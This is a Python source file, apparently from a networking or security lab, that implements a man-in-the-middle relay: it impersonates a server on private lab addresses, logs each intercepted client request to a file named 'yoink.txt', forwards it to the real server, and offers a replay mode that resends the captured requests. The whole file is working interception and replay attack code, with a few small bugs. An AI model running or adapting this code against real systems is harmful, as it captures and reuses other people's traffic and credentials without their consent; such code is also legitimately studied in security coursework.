import socket
import sys
import getpass
import select
from Requests import *
from Database import *
from Server import *

SERVERPY_ADDRESS = '10.13.13.101' #Ubuntu2
CLIENTPY_ADDRESS = '10.13.13.102' #Ubuntu1

class Client:

    def __init__(self,TCP_IP,TCP_PORT,BUFFER_SIZE):
        self.TCP_IP = TCP_IP
        self.TCP_PORT = TCP_PORT
        self.BUFFER_SIZE = BUFFER_SIZE
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            print("Socket created successfully")
            self.socket = s
        except socket.error as msg:
            print("Error creating socket: %s" %msg)
            sys.exit(1)
        try:
            s.connect((self.TCP_IP, self.TCP_PORT))
            print("Socket connection valid")
        except socket.error as msg:
            print("Connection Error %s" %msg)
            sys.exit(1)

    def getTCP_IP(self):
        return self.TCP_IP

    def getTCP_PORT(self):
        return self.TCP_PORT

    def getBUFFER_SIZE(self):
        return self.BUFFER_SIZE

    def getSocket(self):
        return self.socket

class MiddleMan:

    def __init__(self,TCP_IP,TCP_PORT,BUFFER_SIZE):
        HOST = None
        self.TCP_IP = TCP_IP
        self.TCP_PORT = TCP_PORT
        self.BUFFER_SIZE = BUFFER_SIZE
        self.db = Database()

        try:
            c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            c.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.socket = c
        except socket.error as msg:
            c = None
            self.socket = None
            print("could not create socket %s"%(msg))

        try:
            c.bind((self.TCP_IP, self.TCP_PORT))
            self.socket.listen(1)
            #self.append(self)

        except socket.error as msg:
            c.close()
            c = None
            self.socket = None
            print("could not bind or listen %s"%(msg))

    def getTCP_IP(self):
        return self.TCP_IP

    def getTCP_PORT(self):
        return self.TCP_PORT

    def getBUFFER_SIZE(self):
        return self.BUFFER_SIZE

    def getserveradd(self):
        return self.getserveradd

    def getSocket(self):
        return self.socket

    def write(self, writeText):
        try:
            fname = "./data/yoink.txt"
            f = open(fname, 'a')
            if os.path.getsize(fname) + sys.getsizeof(writeText) < 100000:
                try:
                    print("writeText: ", writeText)
                    f.write(writeText + "\n")
                except EXPECTED_EXCEPTION_TYPES as e:
                    print("could not write to file %s"%(e))
                    return
                finally:
                    f.close()
            else:
                print("file is full error")
                return
        except (IOError, OSError) as e:
            print("could not open file %s"%(e))
            return
        return

    def read(self):
        requests = []
        fname = "./data/yoink.txt"
        try:
           f = open(fname, 'r')
           f.close()
           try:
               with open(fname) as infile:
                   for line in infile:
                       lparts = line.split(",")
                       requests.append(line[:-1])
           except IOError as e:
               print("could not read from file %s"%(e))
               return
           finally:
               f.close()
        except (IOError, OSError) as e:
           print("could not open file %s"%(e))
           return
        return requests

    def run(self):
        mode = input("MiddleMan or Replay?")
        if(mode == 'MM'):
            self.mmAttack()
        if(mode == 'RE'):
            self.reAttack()

    def reAttack(self):
        requests = self.read()
        c = Client(CLIENTPY_ADDRESS,5005,1024)
        for req in requests:
            c.getSocket().sendto(req.encode('utf-8'),(self.getTCP_IP(), self.getTCP_PORT()))
            print("Request sent")
            data = c.getSocket().recv(self.getBUFFER_SIZE())
            print("Got response from server")
            resp = data.decode()
            print('Server Msg: '+ resp)
        print('no more things to relay...')
        return

    def mmAttack(self):
        print("lurking...")
        connected_clients = []
        while True:
            attempts_to_connect, wlist, xlist = select.select([self.getSocket()],[], [], 0.05)

            for connections in attempts_to_connect:
                conn, addr = self.getSocket().accept()
                connected_clients.append(conn)
                print('Connection address:', addr)

            clients_allowed = []
            try:
                clients_allowed, wlist, xlist = select.select(connected_clients,[], [], 0.05)
            except select.error:
                pass

            else:
                for conn in clients_allowed:
                    data = conn.recv(self.getBUFFER_SIZE())
                    if data:
                        print("Recieved request")
                        req = data.decode()
                        self.write(req)
                        c = Client(CLIENTPY_ADDRESS,5005,1024)
                        c.getSocket().sendto(req.encode('utf-8'),(self.getTCP_IP(), self.getTCP_PORT()))
                        print("Request sent")
                        data = c.getSocket().recv(self.getBUFFER_SIZE())
                        print("Got response from server")
                        req = data.decode()
                        print('Server Msg: '+ req)
                        conn.sendto(req.encode('utf-8'),(self.getTCP_IP(), self.getTCP_PORT()))
                        print("Sent server data to client")

                    else:
                        print(conn.getsockname(), "disconnected")
                        connected_clients.remove(conn)

if __name__ == "__main__":
    m = MiddleMan(SERVERPY_ADDRESS,5005,1024)
    #print(m)
    #s = MiddleMan('10.13.13.101',5005,1024)
    #print(s)
    #Add a way to change modes, one to lurk and one to act as a client
    m.run()
